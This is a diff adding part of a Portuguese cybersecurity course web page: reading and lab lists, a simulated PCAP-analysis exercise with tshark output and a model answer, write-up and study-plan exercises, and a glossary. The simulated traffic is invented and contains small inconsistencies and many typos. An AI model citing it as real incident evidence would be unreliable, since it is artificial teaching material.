+    <div class="section-num" style="background:rgba(52,211,153,0.15);color:var(--green);border:1px solid rgba(52,211,153,0.3);">09</div>
+    <h2>Recursos para Estudar</h2>
+    <span class="tag tag-basics">Básico</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">📖</span> Livros (iniciais)</div>
+    <div class="checklist">
+      <li>"The Web Application Hacker's Handbook" — Dafydd Stuttard & Marcus Pinto (bíblia de segurança web)</li>
+      <li>"Practical Malware Analysis" — Michael Sikorski & Andrew Honig (análise de malware)</li>
+      <li>"Blue Team Handbook: Incident Response Edition" — Don Murdoch (resposta a incidentes)</li>
+      <li>"Serious Cryptography" — Jean-Philippe Aumasson (criptografia prática)</li>
+      <li>"Linux Command Line" — William Shotts (gratuito online — fundamental para segurança)</li>
+      <li>"Automate the Boring Stuff with Python" — Al Sweigart (gratuito online — automação)</li>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:1rem;">
+    <div class="card-title"><span class="icon">🎓</span> Plataformas de Prática (muitas com plano gratuito)</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:1rem;margin-top:0.5rem;">
+
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <strong style="color:var(--accent);">TryHackMe</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Laboratórios guiados, trilhas completas gratuitas. O melhor para iniciantes.</p>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <strong style="color:var(--accent);">Hack The Box</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Máquinas desafio (do fácil ao extremamente difícil). Sharp para intermediários+.</p>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <strong style="color:var(--accent);">OWASP Juice Shop</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">App web vulnerável local. Perfeito para segurança web sem custo.</p>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <strong style="color:var(--accent);">PortSwigger Web Security Academy</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Laboratórios de XSS, SQLi, CSRF, etc. Gratuito e excelente qualidade.</p>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <strong style="color:var(--accent);">VulnHub</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">VMs vulneráveis para baixar e praticar localmente. Variado em dificuldade.</p>
+      </div>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1rem;">
+        <strong style="color:var(--accent);">CyberDefenders / Blue Team Labs</strong>
+        <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Foco em blue team: análise de logs, forense, resposta a incidentes.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:1rem;">
+    <div class="card-title"><span class="icon">🌐</span> Sites, Comunidades e Notícias</div>
+    <div class="checklist">
+      <li>OWASP (owasp.org) — padrões, Top 10, projetos open-source de segurança</li>
+      <li>SANS Internet Storm Center (isc.sans.edu) — diaries diários de ameaças</li>
+      <li>Krebs on Security (krebsonsecurity.com) — journalismas de segurança de alta qualidade</li>
+      <li>The Hacker News, BleepingComputer — notícias de segurança</li>
+      <li>Reddit: r/cybersecurity, r/netsec, r/AskNetsec, r/HowToHack</li>
+      <li>CTFtime.org — calendário de CTFs, classificações, write-ups</li>
+      <li>GitHub — procure por "awesome cybersecurity", "awesome penetration testing", listas curadas</li>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:1rem;">
+    <div class="card-title"><span class="icon">📋</span> Checklists de Estudo (para não se perder)</div>
+
+    <div style="margin-top:1rem;">
+      <strong style="color:var(--accent);font-size:1rem;">Básico — o que saber antes de tentar pentest:</strong>
+      <div class="checklist" style="margin-top:0.5rem;">
+        <li>Redes: endereço IP, sub-rede, porta, TCP vs UDP, DNS, HTTP/S, OSI model (-lembrar, não decorar)</li>
+        <li>Linux: navegação no terminal, permissões (chmod/chown), processos, pipes, grep/find</li>
+        <li>HTTP: métodos (GET, POST), cookies, session, headers, status codes</li>
+        <li>SQL básico: SELECT, INSERT, UPDATE, DELETE, JOIN — e saber como consultas são formadas</li>
+        <li>Como funciona a web: servidor, cliente, DNS, CDN, proxy, firewall</li>
+        <li>Criptografia: simétrica vs assimétrica, hash, certificados TLS, PKI básica</li>
+        <li>Segurança de geral: CIA, malware tipos, phishing, senhas, MFA, princípio do menor privilégio</li>
+      </div>
+    </div>
+
+    <div style="margin-top:1.5rem;">
+      <strong style="color:var(--yellow);font-size:1rem;">Intermediário — além do básico:</strong>
+      <div class="checklist" style="margin-top:0.5rem;">
+        <li>Como funciona SQL injection profundamente (UNION, blind, time-based)</li>
+        <li>XSS: stored, reflected, DOM-based, bypass de WAF básico</li>
+        <li>Buffer overflow conceito + como explorar em CTFs (GDB, pwntools)</li>
+        <li>Autenticação e sessão: JWT, session fixation, CSRF, OAuth vulnerabilidades</li>
+        <li>Princípios de segurança em DevOps/CI-CD (pipelines, secrets, container security)</li>
+        <li>Uso prático de Nmap (técnicas de scan, bypass de firewall básico)</li>
+        <li>Wireshark filtros e análise de protocolo</li>
+        <li>Leitura de relatórios de pentest (para entender como comunicar achados)</li>
+      </div>
+    </div>
+
+    <div style="margin-top:1.5rem;">
+      <strong style="color:var(--red);font-size:1rem;">Avançado — domínio técnico:</strong>
+      <div class="checklist" style="margin-top:0.5rem;">
+        <li>Exploitação avançada: shellcode, ROP, bypass de mitigações (ASLR, DEP, CFG)</li>
+        <li>Análise de malware: estática e dinâmica, malware famílias, técnicas de evasião</li>
+        <li>Forense digital: coleta de evidência, analysis de memória/disco, chain ofcustody</li>
+        <li>Threat intelligence: TTPs, MITRE ATT&CK, analysis de campanhas</li>
+        <li>Resposta a incidentes: metodologias, playbooks, coordenação, comunicação</li>
+        <li>Automação: Python para segurança, scripting de tarefas de investigação, bots de alerta</li>
+        <li>Segurança de nuvem: AWS/Azure/GCP security, IAM, cloud vulnerabilities</li>
+        <li>Segurança de software: code review security, SAST/DAST/IAST, threat modeling</li>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 10: EXERCÍCIOS AVANÇADOS — CTF-STYLE           -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="exercicios-avancados">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(248,113,113,0.12);color:var(--red);border:1px solid rgba(248,113,113,0.25);">10</div>
+    <h2>Exercícios Avançados — Estilo CTF</h2>
+    <span class="tag tag-advanced">Avançado</span>
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-hard">Exercício 08 — Difícil</span>
+    <h3>Exercício: Análise de Trufeira de Rede (Network Forensics)</h3>
+    <p class="desc">
+      Você recebeu um arquivo PCAP de uma possível infecção. Vamos investigar.
+    </p>
+    <div class="goal"><strong>🎯 Objetivo:</strong> Usar Wireshark (ou tshark) para analisar tráfego e encontrar indícios de comprometimento.</div>
+
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="dots"><span></span><span></span><span></span></span>
+        <span style="font-family:monospace;font-size:0.85rem;">analyst@soc:~$ tshark -r incident.pcap -Y "dns" | head -30</span>
+      </div>
+      <div class="terminal-body">
+<span class="output">1   0.000000 10.0.0.5 → 8.8.8.8 DNS Standard query A www.example.com</span>
+<span class="output">2   0.001200 8.8.8.8 → 10.0.0.5 DNS Standard query response A 93.184.216.34</span>
+<span class="output">3   2.500000 10.0.0.5 → 8.8.8.8 DNS Standard query A update.malware-domain.xyz</span>
+<span class="output">4   2.502100 8.8.8.8 → 10.0.0.5 DNS Standard query response A 198.51.100.42</span>
+<span class="output">5   2.505000 10.0.0.5 → 198.51.100.42 TCP 443 → 443 [SYN]</span>
+<span class="output">6   2.506100 198.51.100.42 → 10.0.0.5 TCP 443 → 443 [SYN, ACK]</span>
+<span class="output">7   2.507000 10.0.0.5 → 198.51.100.42 TCP 443 → 443 [ACK]</span>
+<span class="output">8   2.600000 10.0.0.5 → 198.51.100.42 TLS Application Data</span>
+<span class="output">... (tráfego TLS criptografado, não pode ler o conteúdo diretamente)</span>
+<span class="error">⚠️ O tráfego para 198.51.100.42 está criptografado (TLS) — mas o DNS mostrou que a máquina consultou "update.malware-domain.xyz"</span>
+<span class="output"></span>
+<span class="info"># Também procuramos por comunicação com IP interno suspeito:</span>
+<span class="cmd">tshark -r incident.pcap -Y "ip.addr == 192.168.1.100" | head -20</span>
+<span class="output">9   15.000000 10.0.0.5 → 192.168.1.100 TCP 8080 → 8080 [PSH, ACK] len=256</span>
+<span class="output">10  15.001500 192.168.1.100 → 10.0.0.5 TCP 8080 → 8080 [ACK] len=48</span>
+<span class="output">11  15.500000 10.0.0.5 → 192.168.1.100 TCP 8080 → 8080 [PSH, ACK] len=512</span>
+<span class="output">... (comunicação periódica com máquina interna 192.168.1.100 na porta 8080)</span></pre>
+      </div>
+    </div>
+
+    <ol class="step-list">
+      <li>O que é suspeito na comunicação DNS observada?</li>
+      <li>Por que a comunicação com 198.51.100.42 é preocupante? O que significa "update.malware-domain.xyz"?</li>
+      <li>O tráfego para 192.168.1.100 na porta 8080 — o que isso pode indicar?</li>
+      <li>Quais filtros Wireshark você usaria para investigar mais?</li>
+      <li>Quais seriam seus próximos passos após analisar o PCAP?</li>
+    </ol>
+    <div class="solution-toggle" onclick="toggleSol(this)">Mostrar resposta modelo</div>
+    <div class="solution-content"><span class="comment">
+1. DNS suspeito:
+   - A máquina consultou "update.malware-domain.xyz" — nome de domínio com palavras como "malware" e "update"
+     é altamente suspeito. Domínios legítimos não usam "malware" em nome.
+   - O domínio foi resolvido para 198.51.100.42 — IP que não é de serviço conhecido (ex: AWS, Google).
+   - Isso sugere comunicação com um servidor controlado pelo atacante (possível C2 ou servidor de atualização de malware).
+
+2. Comunicação com 198.51.100.42:
+   - Após resolver o domínio, a máquina iniciou conexão TCP para porta 443 (HTTPS) — tentou se comunicar.
+   - Tráfego TLS criptografado — não podemos ver conteúdo, mas a existência da conexão confirma intenção de comunicação.
+   - Domínio "update.malware-domain.xyz" sugere que a máquina estava tentando baixar algo malicioso ou se comunicar com C2.
+   - Isso é indicação forte de infecção ou tentativa de infecção.
+
+3. Comunicação com 192.168.1.100:8080:
+   - 192.168.1.100 é IP interno (RFC1918) — não é internet pública.
+   - Porta 8080 é alternativa HTTP — comum para proxies, servidores web, e também para C2 (malware usa portas não padrão para esconder).
+   - Comunicação periódica (a cada 0.5s) pode indicar:
+     a) C2 (máquina infectada "taquilhando" com atacante)
+     b) Exfiltração de dados (enviando dados parça a parça)
+     c) Bridge para acesso externo (máquina interna sendo usada como pivô)
+   - IP interno também pode indicar que outra máquina na rede também está infectada, ou que o malware se propagou.
+
+4. Filtros Wireshark para investigar mais:
+   - Verificar HTTP não criptografado: "http"
+   - Verificar DNS queries para domínios suspeitos: "dns.qry.name contains \"malware\" or dns.qry.name contains \"update\""
+   - Verificar injeção de payload em HTTP: "http.request.method == \"POST\" and frame.len > 1000"
+   - Verificar beacons: "tcp.port == 8080 and frame.time_delta > 0.4 and frame.time_delta < 0.6"
+   - Verificar volume de dados enviados: "ip.src == 10.0.0.5 and frame.len > 500"
+   - Verificar conexões para IPs não usuais: "ip.dst not in {8.8.8.8, 1.1.1.1, known-good-IPs}"
+   - Exportar objetos HTTP: "File → Export Objects → HTTP" (se houver HTTP claro)
+   - Follow TCP stream para ver sequência completa: clicar na conexão → Follow → TCP Stream
+
+5. Próximos passos:
+   - ISOLAR a máquina 10.0.0.5 da rede imediatamente.
+   - RECUPERAR a VM/máquina para análise forense (imagem do disco, dump de memória).
+   - ANALISAR logs do sistema (Windows Event Logs, syslog) para ver que processo criou a conexão.
+   - INVESTIGAR 192.168.1.100 — tem malware também? É um C2 interno?
+   - BLOQUEAR 198.51.100.42 e "malware-domain.xyz" em firewall/DNS.
+   - INVESTIGAR se outros dispositivos também se comunicaram com o domínio (investigar DNS logs de toda a rede).
+   - MUDAR credenciais se houve exfiltração oucesso de sistema.
+   - REPORTAR incidente e executar plano de resposta formal.
+    </span></div>
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-pro">Exercício 09 — Profissional</span>
+    <h3>Exercício: Write-up de CTF (simulado)</h3>
+    <p class="desc">
+      Uma habilidade crucial para quem quer trabalhar na área: <span class="highlight">comunicar</span>
+      como você resolveu um desafio. Write-ups são usados em entrevistas, portfólio, e comunidade.
+    </p>
+    <div class="goal"><strong>🎯 Objetivo:</strong> Escrever um write-up completo de um desafio de CTF (pode ser de um CTF real que você fez, ou um simulado).</div>
+    <p style="color:var(--text2);">
+      Estrutura de um bom write-up:
+    </p>
+    <div style="background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:1rem;font-family:'Cascadia Code',monospace;font-size:0.87rem;line-height:1.6;color:var(--text);">
+<span class="comment"># Estrutura de Write-up</span>
+<span class="keyword"># 1. Título do desafio + categoria + pontos + evento/link</span>
+<span class="keyword"># 2. Descrição do problema (o que foi dado, qual o objetivo)</span>
+<span class="keyword"># 3. Abordagem inicial (o que você tentou primeiro e por quê)</span>
+<span class="keyword"># 4. Exploração passo a passo com comandos/screenhots</span>
+<span class="keyword"># 5. Flag encontrada (se for um CTF real — pode ocultar se publicar)</span>
+<span class="keyword"># 6. Lições aprendidas / o que você levaria para próximo</span>
+<span class="keyword"># 7. Referências (ferramentas, documentações usadas)</span>
+    </div>
+    <p style="color:var(--text2);margin-top:0.8rem;">
+      Crie um write-up para um dos exercícios deste curso (ex: Exercício 05 — OWASP Juice Shop)
+      ou para um CTF real que você resolver. Publique no seu blog, GitHub, ou plataforma de sua escolha.
+    </p>
+    <div class="hint">Write-ups mostram não apenas que você resolveu, mas como pensa. Empresas leem write-ups em entrevistas.</div>
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-pro">Exercício 10 — Profissional</span>
+    <h3>Exercício: Crie seu Plano de Estudos Pessoal</h3>
+    <p class="desc">
+      Cybercurso é vasto. Sem plano, fácil se lostir. Crie seu plano com realismo.
+    </p>
+    <div class="goal"><strong>🎯 Objetivo:</strong> Definir metas concretas, realisticas, com prazos.</div>
+    <ol class="step-list">
+      <li>Defina seu objetivo de 6 meses: ex "Sou capaz de fazer pentest básico em aplicações web" ou "Quero emprego como SOC Analyst".</li>
+      <li>Liste 3 habilidades que você precisa desenvolver para chegar lá.</li>
+      <li>Para cada habilidade, escolha 1–2 recursos (livro, curso, plataforma) e defina meta de conclusão.</li>
+      <li>Calcule horas disponíveis por semana para estudo. Seja honesto.</li>
+      <li>Crie um cronograma com milestones mensais.</li>
+      <li>Defina como vai medificar progresso:Write-ups? Certificados? Prática em plataformas? Feedback de mentores?</li>
+      <li>Revisite o plano a cada 30 dias e ajuste.</li>
+    </ol>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 11: GLOSSÁRIO                                  -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="glossario">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(129,140,248,0.15);color:var(--accent2);border:1px solid rgba(129,140,248,0.3);">11</div>
+    <h2>Glossário — Termos que Você Vai Encontrar</h2>
+    <span class="tag tag-basics">Básico</span>
+  </div>
+
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:0.8rem;">
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">APT</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Advanced Persistent Threat — ataque sofisticado e persistente, frequentemente ligado a estados-nacionais.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Beacon / Beaconing</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Comunicação periódica e previsível de máquina infectada com servidor C2 do atacante — como um "ping" regular.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Botnet</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Rede de dispositivos infectados controlados remotamente por atacante — usada para DDoS, spam, mineração.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">C2 (Command & Control)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Servidor que controla máquinas infectadas — manda comandos, recebe dados. Pode ser um domínio, IP, ou serviço.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Crack / Password Cracking</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Processo de descobrir senha a partir de hash (usando força bruta, dicionário, regras). Ferramentas: John, Hashcat.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Credential Stuffing</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Usar pares username/senha vazados em UM site para tentar login em OUTROS sites (muitas pessoas reutilizam senhas).</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">CVE (Common Vulnerabilities and Exposures)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Identificador único de vulnerabilidade (ex: CVE-2026-12345). Base de dados pública de falhas conhecidas.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">DDoS</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Distributed Denial of Service — atacar com múltiplas fontes para derrubar disponibilidade de um serviço.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Exploit / Exploitation</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Código ou técnica que aproveita uma vulnerabilidade para obter acesso não autorizado. "Exploit" também pode ser o código em si.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Hash / Hashing</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Função que transforma dados em valor de tamanho fixo, irreversível (ideais: SHA-256). Usado para integridade e armazenamento de senhas (com salt).</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">HTB / THM</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Hack The Box / TryHackMe — plataformas de prática de segurança com máquinas/lab desafio.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">IAM (Identity & Access Management)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Gestão de identidades e permissões — quem pode acessar o quê. Inclui MFA, SSO, RBAC, política de senhas.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">IDOR (Insecure Direct Object Reference)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Vulnerabilidade onde um usuário acessa recurso de outro alterando um identifier (ex: /api/user/123 → /api/user/124). Quebra confidencialidade.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Insider Threat</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Ameaça vinda de dentro da organização — colaboradores, contratados, ou expedidos com acesso residual.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">JWT (JSON Web Token)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Token compacto para autenticação/stateless. Assinado com chave secreta. Vulnerável se chave for fraca ou algoritmo mal configurado.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Malware</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Software malicioso: virus, worm, trojan, ransomware, spyware, keylogger, rootkit. Categorias se sobrepõem.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">MITRE ATT&CK</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Framework que cataloga táticas e técnicas de adversários (matriz ATT&CK). Usado para modelar ameaças e mapeaar defensas.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">MFA / 2FA</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Multi-Factor Authentication / Two-Factor Authentication — usar mais de um fator (senha + código, biometria, token) para autenticação.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">OSINT</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Open Source Intelligence — coleta de informação a partir de fontes públicas (site, redes sociais, registros, etc.). Fase inicial de recon.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Payload</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Parte de um exploit que executa a ação maliciosa (ex: shellcode, script, comando). É o "que o exploit faz depois de entrar".</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Penetration Test / Pentest</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Teste autorizado que simula ataque para encontrar vulnerabilidades antes dos maus. Diferente de auditoria (que é mais checklist).</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Phishing / Spear Phishing</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Enganar vítima para revelar info ou clicar em link malicioso. Spear phishing é direcionado e personalizado (mais eficaz).</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Ransomware</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Malware que criptografa dados da vítima e pede resgate (geralmente em criptomoeda) para liberar. Backup é a melhor defesa.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">RAT (Remote Access Trojan)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Trojan que dá acesso remoto ao atacante — tipo de controle de desktop remoto, mas não autorizado.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">SIEM (Security Information and Event Management)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Sistema que coleta, correlaciona e alerta sobre logs de segurança. Ex: Splunk, Elastic, Wazuh. Centro de monitoração.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Shellcode</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Pequeno código (geralmente assembly) injetado por exploit para executar shell (pwned). "Shell code" = código pra abrir shell.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">SOC (Security Operations Center)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Centro de operações de segurança — equipe 24/7 que monitora, detecta e responde a incidentes em tempo real.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">SQL Injection</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Injetar SQL malicioso em query para manipular banco de dados — ler, alterar, ou executar comandos. Top 10 OWASP há anos.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Threat Actor / Adversary</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Qualquer um que realiza ação maliciosa contra sistemas — pode ser indivíduo, grupo, ou estado. Sinônimo de atacante.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">TTPs (Tactics, Techniques, and Procedures)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Modo de operar do adversário: táticas (objetivos), técnicas (como), e procedimentos (detalhes). Usado em threat intelligence.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Vetor de Ataque</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Caminho ou método usado pelo atacante para comprometer um sistema (ex: phishing, SQLi, vulnerabilidade de software, etc.).</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">Vulnerabilidade</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Falha ou fraqueza em sistema, software, processo, ou configuração que pode ser explorada por um adversário.</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">WAF (Web Application Firewall)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Firewall especializado em aplicações web — filtra tráfego HTTP/HTTPS para bloquear attacks comuns (SQLi, XSS, etc.).</p>
+    </div>
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:8px;padding:0.8rem;">
+      <strong style="color:var(--accent);font-size:0.95rem;">XSS (Cross-Site Scripting)</strong>
+      <p style="color:var(--text2);font-size:0.85rem;margin-top:0.2rem;">Injetar script malicioso em site que é executado no navegador de outras vítimas — rouba cookies, sessão, ou redireciona.</p>
+    </div>
+  </div>
+
+  <div class="center" style="margin-top:2rem;text-align:center;color:var(--text2);font-size:0.85rem;">
+    Um glossário não substitui entender os conceitos — mas ajuda a ler documentos e conversar com profissionais.
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 12: PRÓXIMOS PASSOS — O QUE FAZER HOJE        -->
+<!-- ══════════════════════════════════════════════════════════════════ -->
+<section class="section" id="proximos-passos">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(52,211,153,0.15);color:var(--green);border:1px solid rgba(52,211,153,0.3);">12</div>
+    <h2>Próximos Passos — O Que Fazer Hoje</h2>
+    <span class="tag tag-basics">Básico</span>
+  </div>
+
+  <div class="callout success">
+    <strong>🚀 Se você chegou até aqui, já tem uma base maior que 90% das pessoas.</strong>
+    Agora, transforme conhecimento em prática. Cybersecurity se aprende fazendo, não apenas lendo.
+  </div>
+
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1rem;">
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">✅</span> Hoje (primeiros 24h)</div>
+      <ul style="padding-left:1.2rem;color:var(--text2);font-size:0.9rem;">
+        <li>Instale Linux em VM (VirtualBox + Ubuntu) ou WSL2 — comece a usar terminal</li>
+        <li>Instale Nmap, Wireshark, Burp Suite Community</li>
+        <li>Crie conta no TryHackMe (plano gratuito) e comece a trilha "Pre-Security" ou "Intro to Cyber Security"</li>
+        <li>Leia a OWASP Top 10 (2021) — entenda os 10 principais vetores de web</li>
+        <li>Escolha 1 exercício deste curso e execute hoje</li>
+      </ul>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">✅</span> Esta semana</div>
+      <ul style="padding-left:1.2rem;color:var(--text2);font-size:0.9rem;">
+        <li>Complete 5–10 rooms do TryHackMe (nível iniciante)</li>
+        <li>Rode Nmap em sua VM e interprete todos os resultados</li>
+        <li>Analise um PCAP simples com Wireshark (ex: capture sua própria navegação)</li>
+        <li>Entenda como funciona uma API HTTP (GET/POST, JSON) usando curl</li>
